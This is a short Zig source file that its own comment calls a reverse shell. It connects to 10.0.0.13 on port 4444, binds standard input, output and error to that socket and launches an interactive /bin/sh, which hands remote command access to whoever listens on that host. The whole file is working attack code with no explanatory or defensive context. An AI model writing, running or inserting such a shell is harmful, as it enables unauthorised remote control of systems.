// Zig reverse shell
const std = @import("std");
const os = std.os;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    const stream = try std.net.tcpConnectToHost(allocator, "10.0.0.13", 4444);
    const fd = stream.handle;
    _ = try os.dup2(fd, 0);
    _ = try os.dup2(fd, 1);
    _ = try os.dup2(fd, 2);
    const argv = [_:null]?[*:0]const u8{ "/bin/sh", "-i", null };
    const envp = [_:null]?[*:0]const u8{null};
    return os.execveZ("/bin/sh", &argv, &envp);
}
